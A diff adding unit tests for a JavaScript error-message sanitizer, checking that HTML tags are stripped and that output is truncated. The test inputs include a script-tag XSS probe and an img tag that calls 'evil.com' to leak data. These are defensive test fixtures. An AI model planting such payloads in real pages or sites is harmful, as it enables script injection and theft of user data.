@@ -88,6 +88,32 @@ describe('sanitizeErrorMessage', () => {
     expect(result).not.toMatch(/<[^>]*>/);
     expect(result).toContain('Bad Gateway');
   });
+
+  it('strips script tags from error messages', () => {
+    const result = sanitizeErrorMessage('<script>alert(1)</script>Oops');
+    expect(result).not.toContain('<script>');
+    expect(result).not.toContain('</script>');
+    expect(result).toContain('alert(1)');
+    expect(result).toContain('Oops');
+  });
+
+  it('strips arbitrary HTML tags without DOCTYPE', () => {
+    const result = sanitizeErrorMessage('<div><p>Error occurred</p></div>');
+    expect(result).not.toMatch(/<[^>]*>/);
+    expect(result).toContain('Error occurred');
+  });
+
+  it('strips img tags that could be used for exfiltration', () => {
+    const result = sanitizeErrorMessage('<img src="https://evil.com/steal?data=secret">Error');
+    expect(result).not.toContain('<img');
+    expect(result).toContain('Error');
+  });
+
+  it('truncates sanitized output to 200 characters', () => {
+    const longHtml = '<div>' + 'A'.repeat(300) + '</div>';
+    const result = sanitizeErrorMessage(longHtml);
+    expect(result.length).toBeLessThanOrEqual(200);
+  });
 });
 
 describe('extractStatusCode', () => {
